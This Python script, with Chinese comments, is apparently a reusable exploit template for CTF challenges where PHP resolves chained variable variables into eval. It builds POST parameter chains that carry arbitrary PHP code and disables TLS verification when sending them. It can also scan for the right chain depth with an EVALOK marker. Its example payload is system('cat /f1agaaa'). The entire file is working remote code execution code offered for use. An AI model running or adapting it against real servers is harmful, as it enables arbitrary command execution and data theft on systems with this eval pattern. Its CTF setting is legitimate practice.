"""
通用模板：PHP 变量链 eval 利用（$$$...$_ 类型题目）
用法：
    python php_eval_chain.py <host> <depth> <code> [depth_scan]
示例：
    python php_eval_chain.py 8d0b8d5f.challenge.ctf.show 36 "system('cat /f1agaaa');"
    python php_eval_chain.py 8d0b8d5f.challenge.ctf.show 0 "echo 'EVALOK';" scan
        # depth=0 + scan：自动从1扫到45找正确层数（用EVALOK标记验证）
"""
import http.client
import ssl
import sys
from urllib.parse import quote

host = sys.argv[1]
depth = int(sys.argv[2])
code = sys.argv[3]
scan = len(sys.argv) > 4 and sys.argv[4] == 'scan'


def build_chain(d, payload):
    names = ['_']
    for i in range(d - 1):
        c = chr(97 + (i % 26))
        names.append(c if i < 26 else c + str(i // 26))
    pairs = ['%s=%s' % (names[i], names[i + 1]) for i in range(len(names) - 1)]
    pairs.append('%s=%s' % (names[-1], quote(payload)))
    return '&'.join(pairs)


def send(body):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(host, context=ctx)
    conn.request('POST', '/', body=body, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    resp = conn.getresponse()
    data = resp.read().decode('utf-8', errors='replace')
    idx = data.find('<code>')
    return data[:idx].strip() if idx >= 0 else data[-800:]


if scan:
    mark = "echo 'EVALOK';"
    for d in range(1, 46):
        out = send(build_chain(d, mark))
        if 'EVALOK' in out:
            print('深度 =', d)
            depth = d
            break
    else:
        print('1-45 全部失败，检查 eval 前缀是否 $$ 型')
        sys.exit(1)

print(send(build_chain(depth, code)))
